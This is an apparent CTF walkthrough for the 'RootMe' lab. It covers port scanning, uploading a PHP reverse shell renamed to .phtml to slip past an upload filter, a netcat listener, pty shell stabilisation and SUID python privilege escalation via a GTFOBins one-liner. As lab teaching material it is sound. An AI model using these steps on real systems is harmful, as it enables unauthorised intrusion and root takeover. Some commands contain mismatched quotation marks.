# RootMe

### Task 2

*Scan the machine, how many ports are open?*

Ans: 2

*What version of Apache is running?*

Ans: 2.4.41

*What service is running on port 22?*

Ans: SSH

*What is the hidden directory?*

Ans: /panel/

### Task 3

Find a form to upload and get a reverse shell, and find the flag.

Inside /usr/share/webshells/php we have php-reverse-shell.php. Open the file and change the IP Address and Port Number. Then change the extension from .php to .phtml so that the server accepts the file. Start an listener in netcat and go to the uploads section on the webserver and select the reverse shell, which gives us the reverse shell in netcat.

nc -lvnp 1337

After getting the shell, since it's not stable we need to write 

python -c ‘import pty;pty.spawn("/bin/bash”)'

After that find the user.txt flag using

find / -type f -name user.txt 2>/dev/null

Ans: flag

### Task 4

*Search for files with SUID permission, which file is weird?*

find / -user root -perm /4000

Ans: /usr/bin/python

to get privilege escalation, go to GTFOBins to search for python Sudo exploitation

python -c 'import os; os.execl("/bin/bash”, "sh", "-p”)’

*root.txt*

Ans: flag